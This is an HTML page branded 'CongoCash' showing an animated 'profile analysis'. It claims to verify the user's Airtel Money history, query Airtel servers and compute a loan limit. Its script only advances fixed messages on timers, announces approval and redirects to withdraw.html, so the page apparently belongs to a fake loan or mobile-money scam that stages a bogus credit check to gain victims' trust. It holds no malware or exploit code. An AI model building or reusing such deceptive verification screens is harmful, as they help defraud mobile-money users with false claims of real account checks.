<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Analyse en cours | CongoCash</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap');

        body {
            font-family: 'Inter', sans-serif;
            background: radial-gradient(circle at center, #2d0606, #000000);
            min-height: 100vh;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .glass-panel {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 32px;
            width: 90%;
            max-width: 450px;
            padding: 40px;
            text-align: center;
            position: relative;
        }

        /* Pulsing Radar Animation */
        .radar {
            width: 120px;
            height: 120px;
            margin: 0 auto 30px;
            position: relative;
            border-radius: 50%;
            border: 2px solid rgba(239, 68, 68, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .radar::before, .radar::after {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 2px solid #ef4444;
            animation: pulse 2s linear infinite;
        }

        .radar::after { animation-delay: 1s; }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            100% { transform: scale(2.5); opacity: 0; }
        }

        .scan-line {
            width: 50px;
            height: 50px;
            background: #ef4444;
            border-radius: 50%;
            filter: blur(15px);
            opacity: 0.6;
        }

        /* Progress Bar */
        .progress-container {
            width: 100%;
            height: 6px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            margin-top: 30px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #b91c1c, #ef4444);
            transition: width 0.5s ease;
            box-shadow: 0 0 10px rgba(239, 68, 68, 0.5);
        }
    </style>
</head>
<body>

    <div class="glass-panel">
        <div class="radar">
            <div class="scan-line"></div>
        </div>

        <h2 class="text-2xl font-semibold mb-2" id="status-title">Analyse du Profil</h2>
        <p class="text-gray-400 text-sm mb-6" id="status-desc">Vérification de votre historique Airtel Money...</p>

        <div class="space-y-4">
            <div class="flex justify-between text-[10px] uppercase tracking-widest text-gray-500 font-bold">
                <span>Système de Risque</span>
                <span id="percent">0%</span>
            </div>
            <div class="progress-container">
                <div class="progress-fill" id="progress"></div>
            </div>
        </div>

        <div class="mt-8 pt-6 border-t border-white/5 grid grid-cols-2 gap-4">
            <div class="text-left">
                <p class="text-[10px] text-gray-500 uppercase">Serveur</p>
                <p class="text-xs font-mono text-green-500">KSH-MAIN-04</p>
            </div>
            <div class="text-right">
                <p class="text-[10px] text-gray-500 uppercase">Statut</p>
                <p class="text-xs font-mono text-red-500 animate-pulse">EN COURS</p>
            </div>
        </div>
    </div>

    <script>
        const progressFill = document.getElementById('progress');
        const percentText = document.getElementById('percent');
        const statusTitle = document.getElementById('status-title');
        const statusDesc = document.getElementById('status-desc');

        const stages = [
            { p: 20, t: "Analyse du Profil", d: "Vérification de l'identité..." },
            { p: 50, t: "Vérification Solde", d: "Interrogation des serveurs Airtel..." },
            { p: 80, t: "Score de Crédit", d: "Calcul de votre limite d'emprunt..." },
            { p: 100, t: "Approbation Prête", d: "Finalisation du virement..." }
        ];

        let currentStage = 0;

        function updateProgress() {
            if (currentStage < stages.length) {
                const stage = stages[currentStage];
                progressFill.style.width = stage.p + '%';
                percentText.innerText = stage.p + '%';
                statusTitle.innerText = stage.t;
                statusDesc.innerText = stage.d;
                
                currentStage++;
                setTimeout(updateProgress, 1500); // Change stage every 1.5s
            } else {
                // Final delay before redirect
                setTimeout(() => {
                    window.location.href = 'withdraw.html';
                }, 1000);
            }
        }

        // Start the simulation
        window.onload = updateProgress;
    </script>
</body>
</html>
